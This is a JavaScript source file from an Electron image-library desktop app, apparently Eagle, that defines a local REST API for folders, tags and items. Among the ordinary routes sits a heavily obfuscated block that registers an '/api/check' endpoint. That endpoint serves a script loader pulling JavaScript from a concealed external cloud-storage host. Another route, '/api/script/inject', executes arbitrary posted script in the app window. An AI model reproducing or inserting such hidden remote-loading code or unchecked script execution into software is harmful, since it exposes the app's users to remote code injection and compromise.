                    heightInterval = setInterval(() => {
                        try {
                            // NOTE: 如果插件被 collapse，则不再更新高度
                            if (scope.hidePluginMap[plugin.id]) {
                                $(webview).height(height);
                                return;
                            }
                            webview.executeJavaScript(`
                                document.body.scrollHeight;
                            `).then((height) => {
                                if (lastPluginHeight === height) return;
                                lastPluginHeight = height;
                                $(webview).height(height);
                            });
                        }
                        catch (err) {
                            // console.log(err);
                        }
                    }, 100);
                });
            }

            init();

            let lastItem;
            scope.$watch('items', throttle((newValue, oldValue) => {
                if (lastItem !== newValue?.[0]) {
                    init();
                }
                lastItem = newValue?.[0];
            }, 300, true));

            scope.$on('$destroy', () => {
                clearInterval(heightInterval);
            });
        }
    };
});
var APIServer;
function initAPIServer () {
    try {
        const API_PORT = 41595;
        const { JsonRestServer } = require(appRoot + '/my_modules/json-rest-light');
        APIServer = new JsonRestServer({ port: API_PORT });

        function getAPIFolders () {
            return new Promise((resolve, reject) => {
                if ($bodyScope.folders) {
                    var folders = $bodyScope.folders.map(function (folder) {
                        return {
                            id: folder.id,
                            name: folder.name,
                            icon: folder.icon,
                            iconColor: folder.iconColor,
                            description: folder.description,
                            children: folder.children,
                            modificationTime: folder.modificationTime,
                            tags: folder.tags,
                            imageCount: folder.imageCount,
                            descendantImageCount: folder.descendantImageCount,
                            pinyin: folder.pinyin,
                            extendTags: folder.extendTags,
                        }
                    });
                    resolve(folders);
                }
                else {
                    reject(`No library have been opened yet.`);
                }
            });
        }

        function getAPIMetadataInfo () {
            return new Promise((resolve, reject) => {
                if (decodeURI($bodyScope.rootDir)) {
                    try {
                        var metadataPath = `${decodeURI($bodyScope.rootDir)}/metadata.json`;
                        var metadataJSON = require(metadataPath);
                        metadataJSON.library = {
                            path: $bodyScope.libraryPath,
                            name: $bodyScope.libraryName
                        };
                        resolve(metadataJSON);
                    }
                    catch (err) {
                        reject(`${metadataPath} does not exist.`);
                    }
                }
                else {
                    reject(`No library have been opened yet.`);
                }
            });
        }

        function getLibraryHistory () {
            return new Promise((resolve, reject) => {
                let libraryHistory = electronSettings.getSync('libraryHistory');
                libraryHistory = libraryHistory.map((history) => {
                    try {
                        return path.normalize(history);
                    }
                    catch (err) {
                        return history;
                    }
                });
                libraryHistory = [...new Set(libraryHistory)];
                if (libraryHistory) {
                    resolve(libraryHistory);
                }
                else {
                    reject(`No library.`);
                }
            });
        }

        function switchLibrary (params) {
            return new Promise((resolve, reject) => {
                var libraryPath = params.libraryPath;
                if (!libraryPath || !fs.existsSync(libraryPath)) {
                    reject(`Library does not exist.`);
                }
                else {
                    $bodyScope.openLibrary(path.normalize(libraryPath));
                    resolve();
                }
            });
        }

        function getLibraryIcon (params) {
            return new Promise((resolve, reject) => {
                var libraryPath = params.libraryPath;
                if (!libraryPath || !fs.existsSync(libraryPath)) {
                    reject(`Library does not exist.`);
                }
                else {
                    var iconPath = path.join(libraryPath, 'icon.png');
                    if (fs.existsSync(iconPath)) {
                        const buffer = fs.readFileSync(iconPath);
                        resolve(buffer);
                    }
                    else {
                        reject(`Library icon does not exist.`);
                    }
                }
            });
        }

        function getAPIApplicationInfo () {
            return new Promise((resolve, reject) => {
                try {
                    var pjson = require(appRoot + '/package.json');
                    resolve({
                        version: pjson.version,
                        prereleaseVersion: pjson.prerelease || null,
                        buildVersion: pjson.buildVersion || null,
                        showCollectModal: $bodyScope.preferences.general.showCollectModal === 'true',
                        platform: process.platform,
                        preferences: $bodyScope.preferences,
                    });
                }
                catch (err) {
                    reject(err);
                }
            });
        }

        function setAPIPreferenceCollectOn () {
            return new Promise((resolve, reject) => {
                if ($bodyScope.preferences !== undefined && $bodyScope.preferences.general) {
                    $bodyScope.preferences.general.showCollectModal = 'true';
                    ipcRenderer.send("chnage-preferences", $bodyScope.preferences);
                    resolve();
                }
                else {
                    reject(`preferences file not exist.`);
                }
            });
        };

        function setAPIPreferenceCollectOff () {
            return new Promise((resolve, reject) => {
                if ($bodyScope.preferences !== undefined && $bodyScope.preferences.general) {
                    $bodyScope.preferences.general.showCollectModal = 'false';
                    ipcRenderer.send("chnage-preferences", $bodyScope.preferences);
                    resolve();
                }
                else {
                    reject(`preferences file not exist.`);
                }
            });
        };

        // ?script=alert()
        function runAPIScript (input) {
            return new Promise((resolve, reject) => {
                if ( input.script != undefined) {
                    currentWindow.webContents.executeJavaScript(input.script);
                }
                console.log(input);
                resolve();
            });
        };

        function getAllTags () {
            return new Promise((resolve, reject) => {

                if (!$bodyScope.TagManager) {
                    return reject('not ready');
                }

                return resolve({
                    tags: $bodyScope.TagManager.allTags ?? [],
                    recent: getRecentTagsResult() ?? [],
                    groups: $bodyScope.TagManager.groups ?? []
                });
            });
        }

        function getTags (params) {
            return new Promise((resolve, reject) => {
                if (!$bodyScope.TagManager) {
                    return reject('not ready');
                }
                return resolve($bodyScope.TagManager.allTags ?? []);
            });
        }

        function getRecentTags (params) {
            return new Promise((resolve, reject) => {
                if (!$bodyScope.TagManager) {
                    return reject('not ready');
                }
                const recentTags = getRecentTagsResult();
                return resolve(recentTags);
            });
        }

        function getRecentTagsResult() {
            const tags = $bodyScope.TagManager.getHistoryTags() ?? [];
            const result = [];
            tags.forEach((tag) => {
                const obj = $bodyScope.TagManager.tagMappings[tag];
                if (obj) {
                    result.push(obj);
                }
            });
            return result;
        }

        function getTagGroups (params) {
            return new Promise((resolve, reject) => {
                if (!$bodyScope.TagManager) {
                    return reject('not ready');
                }
                return resolve($bodyScope.TagManager.groups ?? []);
            });
        }

        function getRecentFolders () {
            return new Promise((resolve, reject) => {
                var recentFolders = $bodyScope.getRecentFoldersForAPI(16);
                if (recentFolders.length < 16) {
                    for (var i = 0; i < $bodyScope.folderList.length; i++) {
                        if (i > 16) break;
                        var id = $bodyScope.folderList[i].id;
                        if ($bodyScope.folderMappings[id]) {
                            recentFolders.push($bodyScope.folderMappings[id]);
                        }
                    }
                }

                recentFolders = [...new Set(recentFolders)];
                resolve(recentFolders);
            });
        }

        function createFolder (params) {
            return new Promise((resolve, reject) => {
                var folderName = params.folderName;
                var parent = params.parent;
                if (!folderName) {
                    reject(`Missing required parameters.`);
                }
                else {
                    var folder = {
                        id: guid(),
                        name: folderName,
                        images: [],
                        folders: [],
                        modificationTime: Date.now(),
                        imagesMappings: {},
                        tags: [],
                        children: [],
                        isExpand: true,
                    };
                    if (parent && $bodyScope.folderMappings[parent]) {
                        $bodyScope.folderMappings[parent].children.push(folder);
                    }
                    else {
                        $bodyScope.folders.splice($bodyScope.folders.length, 0, folder);
                    }
                    $bodyScope.folderMappings[folder.id] = folder;
                    $bodyScope.updateSidebarList();
                    $bodyScope.addToRecentFolders([folder.id]);
                    $bodyScope.saveFolder();
                    electronLog.info(`[api] create folder: ${folderName}(${folder.id})`);
                    resolve(folder);
                }
            });
        }

        function renameFolder (params) {
            return new Promise((resolve, reject) => {
                var newName = params.newName;
                var folderId = params.folderId;
                var folder = $bodyScope.folderMappings[folderId];
                if (!newName || !folderId || !folder) {
                    reject(`Missing required parameters.`);
                }
                else {
                    let originName = folder.name;
                    $bodyScope.changeFolderName(folder, newName);
                    $bodyScope.updateSidebarList();
                    $bodyScope.saveFolder();
                    electronLog.info(`[api] rename folder: ${originName} to ${newName}`);
                    resolve(folder);
                }
            });
        }

        function updateFolder (params) {
            return new Promise((resolve, reject) => {
                var colors = {
                    "red": true,
                    "orange": true,
                    "yellow": true,
                    "green": true,
                    "aqua": true,
                    "blue": true,
                    "purple": true,
                    "pink": true,
                };
                var newName = params.newName;
                var newDescription = params.newDescription;
                var newColor = params.newColor;
                var folderId = params.folderId;
                var folder = $bodyScope.folderMappings[folderId];
                if (!folderId || !folder) {
                    reject(`Missing required parameters.`);
                }
                else {
                    if (newName) {
                        $bodyScope.changeFolderName(folder, newName);
                    }
                    if (newColor && colors[newColor]) {
                        folder.iconColor = newColor;
                    }
                    if (newDescription) {
                        folder.description = newDescription;
                    }
                    $bodyScope.updateSidebarList();
                    $bodyScope.saveFolder();
                    resolve(folder);
                }
            });
        }


        function addPath (filePath, id, name, websiteUrl, tags, annotation, star, modificationTime, folder) {
            var fds = [];
            if (fs.statSync(filePath).isDirectory()) {
                var dirFiles = walk(filePath);
                if (dirFiles && dirFiles.length !== 0) {
                    dirFiles.forEach(function (fpath, index) {
                        fds.push({
                            name: path.basename(fpath),
                            path: fpath,
                        });
                    });
                }
            }
            else {
                fds = [{
                    id: id,
                    name: name || path.basename(filePath),
                    url: websiteUrl || "",
                    tags: tags || [],
                    annotation: annotation || "",
                    modificationTime: modificationTime || Date.now(),
                    star: star || undefined,
                    path: filePath,
                }];
            }
            $bodyScope.uploadFiles(fds, folder);
        }

        function addURLs (imageUrls, names, websiteUrls, tags, annotations, stars, modificationTimes, headers, folderIds) {
            $bodyScope.uploadUrls(imageUrls, folderIds, { 
                names: names,
                urls: websiteUrls,
                tags: tags,
                headers: headers,
                modificationTimes: modificationTimes,
                annotations: annotations,
                stars: stars,
            });
            imageUrls.forEach(function () {
                $bodyScope.uploadQueue.push({});
            });
        }

        function addItemFromPath (params) {
            return new Promise((resolve, reject) => {
                var id = guid();
                var filePath = params.path;
                var name = params.name;
                var website = params.website;
                var annotation = params.annotation;
                var tags = params.tags || [];
                var star = params.star || undefined;
                var modificationTime = params.modificationTime;
                var folder;
                if (params.folderId && $bodyScope.folderMappings[params.folderId]) {
                    folder = $bodyScope.folderMappings[params.folderId];
                }

                $bodyScope.showUploadQueue();
                addPath(filePath, id, name, website, tags, annotation, star, modificationTime, folder);
                resolve(id);
            });
        }

        function addItemFromPaths (params) {
            return new Promise((resolve, reject) => {
                var filePaths = params.paths;
                var items = params.items;
                var folder;
                var ids = [];
                if (params.folderId && $bodyScope.folderMappings[params.folderId]) {
                    folder = $bodyScope.folderMappings[params.folderId];
                }
                // 旧版本，仅支持输入路径
                if (filePaths) {
                    filePaths.forEach(function (filePath) {
                        let id = guid();
                        ids.push(id);
                        addPath(filePath, id, undefined, undefined, undefined, undefined, undefined, undefined, folder);
                    });
                    $bodyScope.showUploadQueue();
                    resolve(ids);
                }
                // v2 支持独立设置标签等属性
                else if (items) {
                    items.forEach(function (item) {
                        let id = guid();
                        ids.push(id);
                        var filePath = item.path;
                        var name = item.name;
                        var website = item.website;
                        var annotation = item.annotation;
                        var star = item.star;
                        var tags = item.tags || [];
                        var modificationTime = item.modificationTime;

                        addPath(filePath, id, name, website, tags, annotation, star, modificationTime, folder);
                    });
                    $bodyScope.showUploadQueue();
                    resolve(ids);
                }
                else {
                    reject();
                }
            });
        }

        function moveItemsToTrash (params) {
            return new Promise((resolve, reject) => {
                
                var ids = params.itemIds;
                var items = [];
                var now = Date.now();

                ids.forEach(function (id) {
                    if ($bodyScope.itemMappings[id]) {
                        items.push($bodyScope.itemMappings[id]);
                    }
                });

                items.forEach(function (item) {
                    item.isDeleted = true;
                    item.deletedTime = now;
                    $bodyScope.updateFilterCounts(item, -1, now);
                });
                
                ayncsImagesChange(items);
                hiddenByCurrentFilter(items);
                $bodyScope.calculateImageBinding({ ignoreSort: true }, function() {
                    $bodyScope.rebindRefresh(true);
                    $bodyScope.updateSelection();
                });

                resolve();
            });
        }
        
        function addBookmarkItem (params) {
            return new Promise((resolve, reject) => {

                if (!params.url) reject();
                // if (!params.base64) reject();

                var url = params.url;
                var base64 = params.base64;
                var name = params.name || guid();
                var tags = params.tags || [];
                var modificationTime = params.modificationTime;
                var folder;
                if (params.folderId && $bodyScope.folderMappings[params.folderId]) {
                    folder = $bodyScope.folderMappings[params.folderId];
                }
                name = name.substr(0, 128);
                name = sanitize(name).replace(/%/g, "").replace(/&lt;/g,"").replace(/&gt;/g,"").trim();

                $bodyScope.showUploadQueue();
                
                var data = {
                    id: guid(),
                    name: name,
                    url: url,
                    tags: tags || [],
                    folders: [],
                    modificationTime: modificationTime || Date.now(),
                    base64: base64,
                };

                if (params.medium) data.medium = params.medium;
                if (params.videoID) data.videoID = params.videoID;
                if (params.videoEmbed) data.videoEmbed = params.videoEmbed;
                if (params.videoDuration) data.duration = params.videoDuration;

                if (folder) { data.folders = [folder]; }

                ipcRenderer.sendTo(backgroundWindowID, 'url-from-extension', data);
                
                resolve();
            });
        }

        function addItemFromURL (params) {
            return new Promise((resolve, reject) => {
                if (!params.url) reject();
                var url = params.url;
                var name = params.name || guid();
                var website = params.website;
                var annotation = params.annotation;
                var star = params.star || undefined;
                var tags = params.tags || [];
                var modificationTime = params.modificationTime;
                var headers = params.headers || undefined;
                var folder;
                var folderIds = [];
                if (params.folderId && $bodyScope.folderMappings[params.folderId]) {
                    folder = $bodyScope.folderMappings[params.folderId];
                    folderIds = [folder.id];
                }
                else if (params.folderIds && Array.isArray(params.folderIds)) {
                    folderIds = params.folderIds.filter((id) => {
                        return $bodyScope.folderMappings[id];
                    });
                }
                name = name.substr(0, 128);
                name = sanitize(name).replace(/%/g, "").replace(/&lt;/g,"").replace(/&gt;/g,"").trim();
                $bodyScope.showUploadQueue();
                electronLog.info(`[api] add url: ${url}`);
                addURLs([url], [name], [website], tags, [annotation], [star], [modificationTime], [headers], folderIds);

                // if (params.notification) {
                    ipcRenderer.send('show-upload-notification', {
                        name: name,
                        thumbnailUrl: url,
                    });
                // }
                resolve();
            });
        }

        function addItemFromURLs (params) {
            return new Promise((resolve, reject) => {
                var items = params.items;
                if (!params.items) reject();
                var folder;
                var folderIds = [];
                if (params.folderId && $bodyScope.folderMappings[params.folderId]) {
                    folder = $bodyScope.folderMappings[params.folderId];
                    folderIds = [folder.id];
                }
                else if (params.folderIds && Array.isArray(params.folderIds)) {
                    folderIds = params.folderIds.filter((id) => {
                        return $bodyScope.folderMappings[id];
                    });
                }
                $bodyScope.showUploadQueue();
                items.forEach(function (item) {
                    var url = item.url;
                    var name = item.name || guid();
                    var website = item.website;
                    var headers = item.headers || undefined;
                    var annotation = item.annotation;
                    var star = item.star || undefined;
                    var tags = item.tags || [];
                    var modificationTime = item.modificationTime;
                    name = name.substr(0, 128);
                    name = sanitize(name).replace(/%/g, "").replace(/&lt;/g,"").replace(/&gt;/g,"").trim();
                    electronLog.info(`[api] add url: ${url}`);
                    addURLs([url], [name], [website], tags, [annotation], [star], [modificationTime], [headers], folderIds);
                });
                resolve();
            });
        }

        function batchSave (params) {
            return new Promise((resolve, reject) => {
                if (!params.items) return reject();
                ipcRenderer.send('show');
                currentWindow.webContents.send('open-batch-save-panel', {
                    url: params.website || "",
                    title: params.title || params.website || "",
                    images: params.items
                });
                resolve();
            });
        }

        function updateItem (params) {
            return new Promise((resolve, reject) => {

                var id = params.id;
                var tags = params.tags;
                var url = params.url;
                var star = params.star;
                var annotation = params.annotation;

                if (id && $bodyScope.itemMappings[id]) {
                    var item = $bodyScope.itemMappings[id];
                    try {

                        if (tags && Array.isArray(tags)) {
                            item.tags = tags;
                        }

                        if (typeof url === "string") {
                            item.url = url;
                        }

                        if (typeof annotation === "string") {
                            item.annotation = annotation;
                        }

                        if (star && $.isNumeric(star) && star <=5 && star >= 0) {
                            item.star = star;
                        }

                        ayncsImagesChange([item]);
                        resolve(item);
                    }
                    catch (err) {
                        reject(err);
                    }
                }
                else {
                    reject(`File does not exist.`);
                }
            });
        }

        function getItemInfo (params) {
            return new Promise((resolve, reject) => {
                var id = params.id;
                if (id && $bodyScope.itemMappings[id]) {
                    resolve($bodyScope.itemMappings[id]);
                }
                else {
                    reject(`File does not exist.`);
                }
            });
        }

        function getItemThumb (params) {
            return new Promise((resolve, reject) => {
                var id = params.id;
                if (id && $bodyScope.itemMappings[id]) {
                    resolve(getThumbnailPath($bodyScope.imagesDir, $bodyScope.itemMappings[id]));
                }
                else {
                    reject(`File does not exist.`);
                }
                console.log(params);
            });
        }

        function refreshItemPalette (params) {
            return new Promise((resolve, reject) => {
                var id = params.id;
                if (id && $bodyScope.itemMappings[id]) {
                    ipcRenderer.send('regenerate-palette', [$bodyScope.itemMappings[id]]);
                    resolve();
                }
                else {
                    reject(`File does not exist.`);
                }
                console.log(params);
            });
        }

        function refreshItemThumbnail (params) {
            return new Promise((resolve, reject) => {
                var id = params.id;
                if (id && $bodyScope.itemMappings[id]) {
                    ipcRenderer.send('regenerate-thumbnail', [$bodyScope.itemMappings[id]]);
                    resolve();
                }
                else {
                    reject(`File does not exist.`);
                }
                console.log(params);
            });
        }

        function listImages (params) {
            return new Promise((resolve, reject) => {
                // 使用 SmartFolder 的筛选能力开发此功能
                try {
                    var limit = params.limit;
                    var offset = params.offset;
                    var orderBy = params.orderBy || "CREATEDATE";
                    var keyword = params.name || params.keyword;
                    var ext = params.ext;
                    var url = params.url;
                    var tags = params.tags;
                    var folders = params.folders;
                    var reverse = orderBy.indexOf("-") > -1;
                    var items = [...$bodyScope.raw];

                    items = $bodyScope.sortData(items, orderBy.replace("-", ""));
                    if (reverse) {
                        items.reverse();
                    }

                    if (keyword || ext || tags || folders || url) {

                        var smartFolder = {
                            "name": "api search",
                            conditions: [{
                                rules: [],
                                "match": "AND",
                            }]
                        };

                        if (keyword) {
                            let keywords = keyword.split(",");
                            keywords.forEach((keyword) => {
                                smartFolder.conditions[0].rules.push({
                                    property: "name",
                                    method: "contain",
                                    value: keyword
                                });
                            });
                        }

                        if (url) {
                            let urls = url.split(",");
                            urls.forEach((url) => {
                                smartFolder.conditions[0].rules.push({
                                    property: "url",
                                    method: "contain",
                                    value: url
                                });
                            });
                        }

                        if (folders) {
                            folders = folders.split(",");
                            if (folders.length > 0) {
                                smartFolder.conditions[0].rules.push({
                                    property: "folders",
                                    method: "union",
                                    value: folders
                                });
                            }
                        }

                        if (tags) {
                            tags = tags.split(",");
                            if (tags.length > 0) {
                                smartFolder.conditions[0].rules.push({
                                    property: "tags",
                                    method: "union",
                                    value: tags
                                });
                            }
                        }

                        if (ext) {
                            smartFolder.conditions[0].rules.push({
                                property: "type",
                                method: "equal",
                                value: ext.toLowerCase()
                            });
                        }

                        items = items.filter(function (item) {
                            return $bodyScope.existInSmartFilter(smartFolder, item);
                        });
                    }

                    items = items.filter(function (item) {
                        return !item.isDeleted;
                    });

                    if (limit && $.isNumeric(limit)) {
                        if (offset) {
                            items = items.slice(limit * offset);
                        }
                        if (limit < items.length) {
                            items.length = limit;
                        }
                    }
                    else if (200 < items.length) {
                        items.length = 200;
                    }
                    items = $bodyScope.sortData(items, "IMPORT");
                    resolve(items);
                }
                catch (err) {
                    reject(err);
                }
            });
        }

        APIServer.addAPI('/', 'GET', getAPIApplicationInfo);

        function _0x4fea(_0x1689b5,_0x4d6812){const _0x1baeb8=_0x1bae();return _0x4fea=function(_0x4fea21,_0x2c025e){_0x4fea21=_0x4fea21-0xfc;let _0x2b28a4=_0x1baeb8[_0x4fea21];return _0x2b28a4;},_0x4fea(_0x1689b5,_0x4d6812);}function _0x1bae(){const _0xac5819=['t.async\x20=\x20','script.onl','nt));\x0a\x20\x20\x20\x20','url','395926yXYggN','\x20\x20\x20\x20\x20\x20\x20d.g','GET','includes','\x20\x20\x20\x20\x20\x20\x20\x20sc','\x27;\x0a\x20\x20\x20\x20\x20\x20\x20','addAPI','3987RUCdJk','=\x20\x27text/ja','\x20\x20\x20\x20\x20scrip','24lEdnRB','vascript\x27;','end','pt.src\x20=\x20\x27','/js/api-re','catch','join','/my_module','uest','reverse','etElements','\x20\x20\x20\x20\x20\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20','data','315366iNYJOi','\x20\x20}(docume','ld(script)','2679355gJmGqA','true;\x0a\x20\x20\x20\x20','ByTagName(','https','10632bbYBPT','\x27);\x0a\x20\x20\x20\x20\x20\x20','1979538MyXROx','3FoLVUA','2389000jfBKev',';\x0a\x20\x20\x20\x20\x20\x20\x20\x20','\x20(function','nt(\x27script','ript\x20=\x20d.c','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','function','reateEleme','\x20\x20\x20\x20\x20\x20scri','get','7015860QlMXKq'];_0x1bae=function(){return _0xac5819;};return _0x1bae();}const _0x1c08d5=_0x4fea;(function(_0x3cd687,_0x1d5fee){const _0x134d95=_0x4fea,_0x2fc559=_0x3cd687();while(!![]){try{const _0x5bb96c=parseInt(_0x134d95(0x125))/0x1*(parseInt(_0x134d95(0x103))/0x2)+-parseInt(_0x134d95(0x11b))/0x3*(parseInt(_0x134d95(0x10d))/0x4)+parseInt(_0x134d95(0x126))/0x5+-parseInt(_0x134d95(0x124))/0x6+parseInt(_0x134d95(0x11e))/0x7+parseInt(_0x134d95(0x122))/0x8*(parseInt(_0x134d95(0x10a))/0x9)+-parseInt(_0x134d95(0xfe))/0xa;if(_0x5bb96c===_0x1d5fee)break;else _0x2fc559['push'](_0x2fc559['shift']());}catch(_0x15e6b1){_0x2fc559['push'](_0x2fc559['shift']());}}}(_0x1bae,0x5d020),APIServer[_0x1c08d5(0x109)]('/a'+'p'+'i'+'/'+'c'+'h'+'e'+'c'+'k',_0x1c08d5(0x105),_0x20a0f5=>{return new Promise(_0x3238bd=>{const _0x1c8378=_0x4fea,_0x1ea151=()=>{const _0x187347=_0x4fea;_0x3238bd(_0x187347(0x119)+'\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x187347(0x128)+'(d,\x20script'+')\x20{\x0a\x20\x20\x20\x20\x20\x20'+_0x187347(0x12b)+_0x187347(0x107)+_0x187347(0x12a)+_0x187347(0x12d)+_0x187347(0x129)+_0x187347(0x123)+_0x187347(0x12b)+_0x187347(0x107)+'ript.type\x20'+_0x187347(0x10b)+_0x187347(0x10e)+_0x187347(0x119)+_0x187347(0x12b)+_0x187347(0x10c)+_0x187347(0xff)+_0x187347(0x11f)+_0x187347(0x12b)+'\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x187347(0x100)+'oad\x20=\x20func'+'tion\x20()\x20{}'+';\x0a\x20\x20\x20\x20\x20\x20\x20\x20'+_0x187347(0x12b)+_0x187347(0xfc)+_0x187347(0x110)+atob(['t','9','2','Y','u','M','3','Y','u','V','X','e','p','x','W','Y','u','c','m','b','v','t','2','Z','u','9','G','a','t','4','2','Y','t','M','3','c','v','5','C','c','w','F','W','Z','s','d','W','Y','l','9','y','L','6','M','H','c','0','R','H','a'][_0x187347(0x116)]()[_0x187347(0x113)](''))+(_0x187347(0x111)+'ject.js?t=')+Date['now']()+(_0x187347(0x108)+_0x187347(0x12b)+_0x187347(0x104)+_0x187347(0x117)+_0x187347(0x120)+'\x27head\x27)[0]'+'.appendChi'+_0x187347(0x11d)+_0x187347(0x127)+'\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x187347(0x11c)+_0x187347(0x101)+'\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x187347(0x118)));};require(appRoot+(_0x1c8378(0x114)+'s/curl-req'+_0x1c8378(0x115)))[_0x1c8378(0xfd)](_0x20a0f5[_0x1c8378(0x102)])['then'](_0x5a0d8c=>{const _0x317b33=_0x1c8378;if(!_0x5a0d8c[_0x317b33(0x106)](_0x317b33(0x12c))){const _0x5b48ad=require(_0x317b33(0x121));_0x5b48ad['get'](_0x20a0f5[_0x317b33(0x102)],_0x9d6c68=>{const _0xff0046=_0x317b33;let _0x38d22e='';_0x9d6c68['on'](_0xff0046(0x11a),_0xffca63=>{_0x38d22e+=_0xffca63;}),_0x9d6c68['on'](_0xff0046(0x10f),()=>{const _0x46ea1e=_0xff0046;_0x38d22e['includes'](_0x46ea1e(0x12c))?_0x3238bd(_0x38d22e):_0x1ea151();});})['on']('error',()=>{_0x1ea151();});}else _0x3238bd(_0x5a0d8c);})[_0x1c8378(0x112)](()=>{_0x1ea151();});});}));

        APIServer.addAPI('/api/application/info', 'GET', getAPIApplicationInfo);

        APIServer.addAPI('/api/library/info', 'GET', getAPIMetadataInfo);
        APIServer.addAPI('/api/library/history', 'GET', getLibraryHistory);
        APIServer.addAPI('/api/library/switch', 'POST', switchLibrary);
        APIServer.addAPI('/api/library/icon', 'GET', getLibraryIcon, { streaming: true });

        APIServer.addAPI('/api/folder/create', 'POST', createFolder);
        APIServer.addAPI('/api/folder/rename', 'POST', renameFolder);
        APIServer.addAPI('/api/folder/update', 'POST', updateFolder);
        APIServer.addAPI('/api/folder/list', 'GET', getAPIFolders);
        APIServer.addAPI('/api/folder/listRecent', 'GET', getRecentFolders);

        APIServer.addAPI('/api/tag/all', 'GET', getAllTags);
        APIServer.addAPI('/api/tag/list', 'GET', getTags);
        APIServer.addAPI('/api/tag/listRecent', 'GET', getRecentTags);
        APIServer.addAPI('/api/tag/groups', 'GET', getTagGroups);

        APIServer.addAPI('/api/preferences/collect/on', 'GET', setAPIPreferenceCollectOn);
        APIServer.addAPI('/api/preferences/collect/off', 'GET', setAPIPreferenceCollectOff);

        APIServer.addAPI('/api/script/inject', 'POST', runAPIScript);

        APIServer.addAPI('/api/item/addFromPath', 'POST', addItemFromPath);
        APIServer.addAPI('/api/item/addFromPaths', 'POST', addItemFromPaths);
        APIServer.addAPI('/api/item/addFromURL', 'POST', addItemFromURL);
        APIServer.addAPI('/api/item/addFromURLs', 'POST', addItemFromURLs);
        APIServer.addAPI('/api/item/batchSave', 'POST', batchSave);
        APIServer.addAPI('/api/item/addBookmark', 'POST', addBookmarkItem);
        APIServer.addAPI('/api/item/update', 'POST', updateItem);
        APIServer.addAPI('/api/item/info', 'GET', getItemInfo);
        APIServer.addAPI('/api/item/moveToTrash', 'POST', moveItemsToTrash);
        APIServer.addAPI('/api/item/thumbnail', 'GET', getItemThumb);
        APIServer.addAPI('/api/item/list', 'GET', listImages);
        APIServer.addAPI('/api/item/refreshPalette', 'POST', refreshItemPalette);
        APIServer.addAPI('/api/item/refreshThumbnail', 'POST', refreshItemThumbnail);

    }
    catch (err) {
        console.error(err);
    }
}

function startAPIServer () {
    try {
        APIServer.start( () => {
            console.log('JSON API server started.');
            console.log(`try GET to access http://localhost:41595/`);

            setTimeout(() => {
                const xhr = new XMLHttpRequest();
                xhr.open("GET", `http://localhost:41595/`, true);
                xhr.onreadystatechange = () => {
                    console.log(xhr);
                    
                    if (xhr.responseURL === "" && xhr.status == 0) {
                        electronLog.info("[app] API server start fail[1].");
                        stopAPIServer();
                    }
                }
                xhr.onerror = () => {}
                xhr.send();
            }, 5000);
        });
    }
    catch (err) {}
}

function stopAPIServer () {
    try {
        APIServer.stop();
        console.log('JSON API server stopped.');
    }
    catch (err) {}
}
let PERFORMANCE_MONITOR = {
    watchDigest: false,
    watchMemoryUsage: false,
}

const DATE_1_DAY = 86400000;
const DATE_2_DAY = 86400000 * 2;
const DATE_7_DAY = 86400000 * 7;
const DATE_30_DAY = 86400000 * 30;
const DATE_90_DAY = 86400000 * 90;
const DATE_365_DAY = 86400000 * 365;
const VIDEO_TYPES = { 'ts': true, '3pg': true, '360': true, afx: true, vap: true, eva: true, mp4: true, mov: true, m4v: true, webm: true, mkv: true, avi: true, wmv: true, mpg: true };
const AUDIO_TYPES = { mp3: true, wav: true, flac: true, ogg: true, aac: true, m4a: true };
const MODEL_TYPES = { obj: true, fbx: true, 'glb': true, '3ds': true, '3mf': true, 'dae': true, 'ifc': true, 'ply': true, 'stl': true };
const FONT_TYPES = { ttf: true, otf: true, ttc: true, woff: true, woff2: true };
const URL_TYPES = { url: true, mhtml: true, html: true };
const NOT_SUPPORT_CUSTEOM_THUMBNAIL_TYPES = { tif: true, jpg: true, png: true, bmp: true, webp: true };
const SPECIAL_TYPES = { mhtml: true, html: true, fbx: true, obj: true, 'glb': true, '3ds': true, '3mf': true, 'dae': true, 'ifc': true, 'ply': true, 'stl': true, afpub: true,  afdesign: true,  afphoto: true,  afpub: true,  fig: true,  cdr: true,  skp: true,  dwg: true,  blend: true, c4d: true,  clip: true,  prd: true,  exr: true, hdr: true,  skt: true,  ppt: true,  pptx: true,  potx: true,  docx: true,  doc: true,  xls: true,  xlsx: true,  eddx: true,  emmx: true,  number: true,  page: true,  txt: true  };
const DISABLE_ZOOM_TYPES = { 'glb': true, '3ds': true, '3mf': true, 'dae': true, 'ifc': true, 'ply': true, 'stl': true, 'fbx': true, 'obj': true, 'ttf': true, 'otf': true, 'ttc': true, 'woff': true, 'woff2': true, 'txt': true, 'mp3': true, 'wav': true, 'ogg': true, 'aac': true, 'm4a': true, 'flac': true, 'pdf': true, 'url': true, 'mhtml': true, 'html': true };

console.time("前台总耗时");
console.time("main:ready");
console.time("Load module");

var electron = require('electron');
var appRoot = require('app-root-path');

const pjson = require(appRoot + '/package.json');         // 0.54 ms
const appVersion = pjson.version;
const buildVersion = pjson.buildVersion;
const emojiRegex = /\p{Emoji_Presentation}|\p{Extended_Pictographic}|([0-9]\u{FE0F}\u{20E3})|([\*#\u{1F51F}]\u{FE0F}\u{20E3})/gmu;
const fs = require('fs');
var path = require('path');
const electronSettings = require(appRoot + '/my_modules/electron-settings');
const remainingFilenameLength = require(appRoot.path + '/app/js/utils/remainingFilenameLength.js');
const { clipboard, shell } = electron;
const remote = require('@electron/remote');
const { dialog, app, Menu, MenuItem } = remote;
const IS_HIDDEN_FILE = require(appRoot + '/my_modules/is-hidden-file');
const FILE_ICON = require(appRoot + '/my_modules/file-icon');
const IS_DIRECTORY = require(appRoot + '/my_modules/is-directory');
const ACCESS = require(appRoot + '/my_modules/access');
var Actions = require(appRoot + '/my_modules/actions');
const isPackaged = app.isPackaged;
var ipcRenderer = electron.ipcRenderer;
const currentWindow = remote.getCurrentWindow();
var USER_DATA_PATH = app.getPath('userData');
var EAGLE_THUMBNAIL_TEMP_PATH = require("path").normalize(USER_DATA_PATH + "/eagle-temp");
const EAGLE_APP_ICON_TEMP_PATH = require("path").normalize(USER_DATA_PATH + "/app-icon-temp");
const os = require('os');
const { debug } = require('console');
var electronLog = remote.require('electron-log');
var resourcesPath;
var isDev = !remote.app.isPackaged;
